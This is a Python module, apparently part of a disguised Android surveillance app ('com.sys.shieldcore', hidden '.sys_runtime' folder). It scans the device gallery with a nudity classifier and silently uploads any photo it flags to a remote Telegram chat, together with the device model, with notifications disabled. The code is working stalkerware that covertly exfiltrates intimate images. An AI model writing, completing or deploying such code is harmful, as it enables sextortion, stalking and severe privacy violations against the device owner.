# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import sqlite3
import hashlib
import json
from datetime import datetime

# ========== المسارات الموحّدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
MODELS_DIR = os.path.join(P, "models")
CONFIG_FILE = os.path.join(P, "nude_config.json")

if not os.path.exists(MODELS_DIR):
    os.makedirs(MODELS_DIR)

# ========== إعداد التسجيل ==========
logging.basicConfig(
    filename=os.path.join(P, "n.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ========== استيراد المكتبات مع الحماية (تصحيح الخطأ 1) ==========
AI_AVAILABLE = False
Interpreter = None
np = None
Image = None
ImageOps = None
UnidentifiedImageError = None

try:
    import numpy as np
    from PIL import Image, ImageOps, UnidentifiedImageError
    Image.MAX_IMAGE_PIXELS = 50_000_000

    # المحاولة الأولى: tflite-runtime (الأخف)
    try:
        from tflite_runtime.interpreter import Interpreter
        AI_AVAILABLE = True
        logging.info("✅ Using tflite_runtime")
    except ImportError:
        # المحاولة الثانية: tensorflow.lite (أثقل لكنه بديل)
        try:
            import tensorflow as tf
            Interpreter = tf.lite.Interpreter
            AI_AVAILABLE = True
            logging.info("✅ Using tensorflow.lite (fallback)")
        except ImportError:
            logging.error("❌ Neither tflite_runtime nor tensorflow found. AI disabled.")
            # إنشاء صنف وهمي لتجنب انهيار الكود
            class Interpreter:
                pass
except ImportError as e:
    logging.error(f"❌ Core libraries missing (numpy/PIL): {e}")
    class Interpreter:
        pass
    UnidentifiedImageError = Exception if UnidentifiedImageError is None else UnidentifiedImageError


# ========== كاشف المحتوى ==========
class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False
        self._active_lock = threading.Lock()
        self.model = None
        self._model_lock = threading.RLock()
        self.last_run = 0
        self._loading_engine = False
        self._load_error_count = 0
        self._max_load_errors = 10           # حد أقصى للمحاولات
        self._input_size = (224, 224)
        self._config = self._load_config()

        self.model_path = self._find_model()
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()

        # ✅ تصحيح الخطأ 2: تشغيل خيط إعادة التحميل التلقائي إذا توفّر النموذج
        if AI_AVAILABLE and self.model_path:
            threading.Thread(target=self._load_engine_forever, daemon=True).start()
            logging.info("🔄 AI engine loading thread started.")
        else:
            logging.warning(f"⚠️ AI unavailable or model missing. Path: {self.model_path}, AI_AVAILABLE: {AI_AVAILABLE}")

    # ---------- الإعدادات ----------
    def _load_config(self):
        default_config = {
            "model_min_size": 5_000_000,       # 5 ميجابايت
            "max_file_size": 8 * 1024 * 1024,  # 8 ميجابايت كحد أقصى للصورة
            "min_image_size": 50,
            "max_image_size": 10000,
            "scan_interval": 1800,
            "nude_threshold": 0.85,
            "questionable_threshold": 0.45,
            "aspect_bonus": 0.03,
            "report_enabled": True,
            "cache_ttl": 30 * 86400            # 30 يومًا
        }
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    loaded = json.load(f)
                    default_config.update(loaded)
            except Exception as e:
                logging.error(f"Config load error: {e}")
        return default_config

    def _save_config(self):
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self._config, f)
            return True
        except Exception as e:
            logging.error(f"Config save error: {e}")
            return False

    # ---------- البحث عن ملف النموذج ----------
    def _find_model(self):
        model_min_size = self._config.get("model_min_size", 5_000_000)
        possible_paths = [
            os.path.join(MODELS_DIR, "engine_v2.tflite"),
            os.path.join(P, "engine_v2.tflite"),
            os.path.join(os.getcwd(), "assets", "engine_v2.tflite"),
            os.path.join(os.getcwd(), "engine_v2.tflite"),
            "/data/data/com.sys.shieldcore/files/.sys_runtime/models/engine_v2.tflite",
            "/data/data/com.sys.shieldcore/files/engine_v2.tflite",
            "/data/data/com.sys.shieldcore/files/assets/engine_v2.tflite"
        ]
        for path in possible_paths:
            try:
                if os.path.exists(path):
                    size = os.path.getsize(path)
                    if size >= model_min_size:
                        logging.info(f"✅ Model found at: {path} ({size/1024/1024:.2f} MB)")
                        return path
                    else:
                        logging.warning(f"⚠️ Model too small at {path}: {size} bytes")
            except Exception as e:
                logging.error(f"Error checking {path}: {e}")
        logging.error("❌ Model not found in any expected location.")
        return None

    # ---------- قاعدة البيانات (معالجة الأخطاء - تصحيح الخطأ 3) ----------
    def _init_db(self):
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                conn.execute('''CREATE TABLE IF NOT EXISTS scan_logs (
                    h TEXT PRIMARY KEY,
                    ts INTEGER,
                    path TEXT
                )''')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)')
                # تنظيف السجلات القديمة
                ttl = self._config.get("cache_ttl", 30 * 86400)
                old = int(time.time()) - ttl
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old,))
                conn.commit()
                conn.execute('PRAGMA integrity_check')
        except Exception as e:
            logging.error(f"DB init error: {e}")

    def _db_execute(self, query, params=(), commit=True):
        """تنفيذ آمن لاستعلام قاعدة البيانات (معالجة الخطأ 3)"""
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                conn.execute(query, params)
                if commit:
                    conn.commit()
            return True
        except Exception as e:
            logging.error(f"DB execute error: {e}")
            return False

    # ---------- تحميل المحرك تلقائيًا مع إعادة المحاولة (تصحيح الخطأ 2) ----------
    def _load_engine_forever(self):
        """يحاول تحميل النموذج إلى ما لا نهاية حتى ينجح أو يصل للحد الأقصى للأخطاء"""
        if not AI_AVAILABLE or self._loading_engine or not self.model_path:
            return
        self._loading_engine = True
        attempt = 0
        wait_time = 3
        model_min_size = self._config.get("model_min_size", 5_000_000)

        while self._load_error_count < self._max_load_errors:
            try:
                # التأكد من وجود الملف وحجمه
                if not os.path.exists(self.model_path):
                    raise FileNotFoundError(f"Model disappeared: {self.model_path}")
                file_size = os.path.getsize(self.model_path)
                if file_size < model_min_size:
                    raise ValueError(f"Model too small: {file_size} bytes")

                # التحميل الفعلي
                self.model = Interpreter(model_path=self.model_path, num_threads=2)
                self.model.allocate_tensors()

                # التحقق من صحة النموذج
                inputs = self.model.get_input_details()
                outputs = self.model.get_output_details()
                if not inputs or not outputs:
                    raise ValueError("Model has no inputs/outputs")

                self.in_idx = inputs[0]['index']
                self.out_idx = outputs[0]['index']
                input_shape = inputs[0]['shape']
                if len(input_shape) >= 3:
                    self._input_size = (input_shape[1], input_shape[2])
                elif len(input_shape) >= 2:
                    self._input_size = (input_shape[1], input_shape[1])

                logging.info(f"✅ AI Engine loaded successfully (input size: {self._input_size})")
                self._loading_engine = False
                self._load_error_count = 0
                return  # نجاح

            except Exception as e:
                self._load_error_count += 1
                logging.error(f"Load attempt {attempt+1} failed: {e}")
                self.model = None
                wait_time = min(wait_time + 2, 60)  # زيادة تدريجية حتى 60 ثانية

            attempt += 1
            time.sleep(wait_time)

        logging.error("❌ Max load attempts reached. AI permanently disabled.")
        self._loading_engine = False

    # ---------- حالات النموذج ----------
    def is_ready(self):
        with self._model_lock:
            return AI_AVAILABLE and self.model is not None

    def is_loading(self):
        return self._loading_engine

    # ---------- حذف آمن ----------
    def _safe_remove(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
                return True
        except Exception as e:
            logging.error(f"Remove error: {e}")
        return False

    # ---------- تحليل الصورة (يعيد درجة احتمالية بين 0.0 و 1.0) ----------
    def analyze(self, path):
        if not AI_AVAILABLE or not Image or not np:
            return 0.0

        with self._model_lock:
            if self.model is None:
                # إذا لم يُحمّل بعد، حاول تشغيل خيط التحميل مرة أخرى
                if not self._loading_engine and self._load_error_count < self._max_load_errors:
                    threading.Thread(target=self._load_engine_forever, daemon=True).start()
                return 0.0

        # التحقق من صحة المسار والامتداد
        if not path or not isinstance(path, str) or not os.path.exists(path):
            return 0.0

        try:
            file_size = os.path.getsize(path)
            if file_size > self._config.get("max_file_size", 8*1024*1024) or file_size < 100:
                return 0.0
        except:
            return 0.0

        if os.path.splitext(path)[1].lower() not in ('.png','.jpg','.jpeg','.webp','.bmp','.gif','.tiff'):
            return 0.0

        try:
            with Image.open(path) as raw_img:
                w, h = raw_img.size
                min_sz, max_sz = self._config["min_image_size"], self._config["max_image_size"]
                if w < min_sz or h < min_sz or w > max_sz or h > max_sz:
                    return 0.0

                # مكافأة الصور العمودية
                aspect_bonus = self._config["aspect_bonus"] if h > w * 1.2 else 0.0

                try:
                    img = ImageOps.fit(raw_img, self._input_size, method=Image.BILINEAR, centering=(0.5,0.5))
                except:
                    img = raw_img.convert('RGB').resize(self._input_size, Image.BILINEAR)

            # تحويل إلى مصفوفة
            arr = np.asarray(img, dtype=np.float32)
            arr = np.expand_dims(arr, axis=0) / 255.0

            # تنفيذ الاستدلال
            with self._model_lock:
                self.model.set_tensor(self.in_idx, arr)
                self.model.invoke()
                out = self.model.get_tensor(self.out_idx)[0]

            prob = float(out[1]) / (float(out[0]) + float(out[1]) + 1e-8) if len(out) > 1 else float(out[0])
            prob = min(max(prob, 0.0), 1.0)
            prob = min(prob + aspect_bonus, 1.0)
            return prob

        except UnidentifiedImageError:
            logging.warning(f"Cannot identify image: {path}")
            return 0.0
        except Exception as e:
            logging.error(f"Analyze error ({path}): {e}")
            return 0.0

    # ---------- المسح الدوري ----------
    def scan(self):
        if not AI_AVAILABLE or self.active:
            return False
        if not self.is_ready():
            if not self._loading_engine:
                threading.Thread(target=self._load_engine_forever, daemon=True).start()
            return False
        now = time.time()
        if (now - self.last_run) < self._config["scan_interval"]:
            return False
        self.last_run = now
        threading.Thread(target=self._worker, daemon=True).start()
        return True

    def _worker(self):
        if not self._active_lock.acquire(blocking=False):
            return
        try:
            self.active = True
            sc = getattr(self.mon, 'media_scanner', None) if self.mon else None
            if not sc:
                return

            items = sc.get_gallery_by_category("pending", limit=30)
            if not items:
                return

            nude_threshold = self._config["nude_threshold"]
            questionable_threshold = self._config["questionable_threshold"]
            processed = 0
            detected = 0

            for item in items:
                try:
                    path = item.get("path")
                    h = item.get("hash")
                    if not path or not os.path.exists(path):
                        continue
                    if self._is_cached(h):
                        continue

                    prob = self.analyze(path)
                    processed += 1

                    if prob > nude_threshold:
                        sc.update_category(h, "nude", prob)
                        detected += 1
                        if self._config.get("report_enabled", True):
                            self._report(path, item.get("label","??"), prob)
                    elif prob > questionable_threshold:
                        sc.update_category(h, "questionable", prob)
                    else:
                        sc.update_category(h, "normal", prob)

                    self._mark_cached(h, path)
                    if processed % 3 == 0:
                        time.sleep(0.3)
                except Exception as e:
                    logging.error(f"Worker item error: {e}")
                    continue

            if detected > 0:
                logging.info(f"✅ Detected {detected} sensitive images")

        except Exception as e:
            logging.error(f"Worker error: {e}")
        finally:
            self.active = False
            self._active_lock.release()

    # ---------- إدارة الكاش مع معالجة الأخطاء (تصحيح الخطأ 3) ----------
    def _is_cached(self, h):
        if not h:
            return False
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                cur = conn.execute("SELECT 1 FROM scan_logs WHERE h=?", (h,))
                return cur.fetchone() is not None
        except Exception as e:
            logging.error(f"Cache check error: {e}")
            return False

    def _mark_cached(self, h, path=""):
        if not h:
            return
        self._db_execute("INSERT OR REPLACE INTO scan_logs VALUES (?,?,?)",
                         (h, int(time.time()), path or ""))

    # ---------- إرسال التقارير ----------
    def _report(self, path, label, confidence):
        if not self.mon:
            return
        tg = getattr(self.mon, 'ui', None)
        if not tg:
            return
        target = getattr(tg, 'dat', None) or getattr(tg, 'ctrl', None)
        if not target or not os.path.exists(path):
            return

        caption = (
            f"🔞 **AI Detection**\n"
            f"📱 Device: `{getattr(self.mon,'dmd','?')}`\n"
            f"🏷️ Label: `{label}`\n"
            f"🎯 Confidence: `{confidence:.0%}`\n"
            f"⏰ Time: `{datetime.now().strftime('%H:%M:%S')}`"
        )
        try:
            with open(path, 'rb') as f:
                tg._api("sendPhoto", {
                    "chat_id": target,
                    "caption": caption,
                    "parse_mode": "Markdown",
                    "disable_notification": True
                }, {"photo": f})
        except Exception as e:
            logging.error(f"Report send error: {e}")

    # ---------- أدوات مساعدة ----------
    def clear_cache(self):
        """يمسح سجل التحليل بالكامل"""
        return self._db_execute("DELETE FROM scan_logs") and self._db_execute("VACUUM", commit=True)

    def get_stats(self):
        try:
            with sqlite3.connect(self.db, check_same_thread=False) as conn:
                cur = conn.execute("SELECT COUNT(*) FROM scan_logs")
                total = cur.fetchone()[0]
                cur = conn.execute("SELECT MIN(ts), MAX(ts) FROM scan_logs")
                min_ts, max_ts = cur.fetchone()
                return {
                    "total": total,
                    "oldest": datetime.fromtimestamp(min_ts).isoformat() if min_ts else None,
                    "newest": datetime.fromtimestamp(max_ts).isoformat() if max_ts else None,
                    "model_ready": self.is_ready(),
                    "model_loading": self._loading_engine,
                    "active": self.active,
                    "model_path": self.model_path,
                    "input_size": self._input_size
                }
        except Exception as e:
            logging.error(f"Stats error: {e}")
            return {"total": 0}


# ========== دالة المصنع ==========
def create(mon=None):
    return NudeDetector(mon)
